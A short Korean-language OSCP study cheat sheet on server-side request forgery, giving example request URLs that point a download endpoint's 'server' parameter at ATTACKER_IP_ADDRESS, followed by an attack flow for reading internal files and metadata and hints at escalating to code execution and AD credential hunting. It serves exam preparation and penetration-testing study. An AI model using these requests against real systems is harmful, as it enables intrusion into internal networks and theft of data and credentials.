# ssrf (Server-Side Request Forgery)

## 개요

SSRF(서버 측 요청 위조)는 서버가 외부 요청을 보내도록 속이는 취약점이다.
서버가 내부망에만 있는 자원(메타데이터 서비스, 내부 DB, 파일)에 접근하도록 할 수 있다.
OSCP 웹 공격 단계에서 빈출이다.

## 사용법

```bash
# 서버가 가져오는 URL을 attacker 서버로 바꾼다
http://VICTIM_IP:8087/download?server=secure-file-storage.com:8087&id=75482342

# 공격자 서버로 요청 전달
http://VICTIM_IP:8087/download?server=ATTACKER_IP_ADDRESS&id=75482342
```

## 각 파라미터의 의미

| 항목 | 의미 |
|------|------|
| `server` | 서버가 요청을 보낼 URL (공격 대상) |
| `id` | 파일 식별자 (대상마다 다름) |
| `ATTACKER_IP_ADDRESS` | 공격자 IP |

## 실전 흐름

1) 서버의 내부망 접근 확인 (공격자 IP로 요청)
2) 파일 다운로드로 내부 파일 읽기
3) 내부망 서비스의 메타데이터/설정 정보 수집

## 대응

- 파라미터에 URL이 아닌 값이 오는지 먼저 확인한다.
- SSRF로 내부 파일을 읽었다면, 같은 요청으로 원격 코드 실행까지 시도할 수 있다.
- 방어: SSRF는 서버의 egress(나가는 트래픽)를 제한하고, 내부 요청을 차단한다.

## 활용

- SSRF로 내부 DB나 파일시스템에 접근하면, 이후 AD 크리덴셜 탐색이 쉬워진다.
- OSCP 시험의 웹 공격 단계에서 자주 나오는 빈출이다.
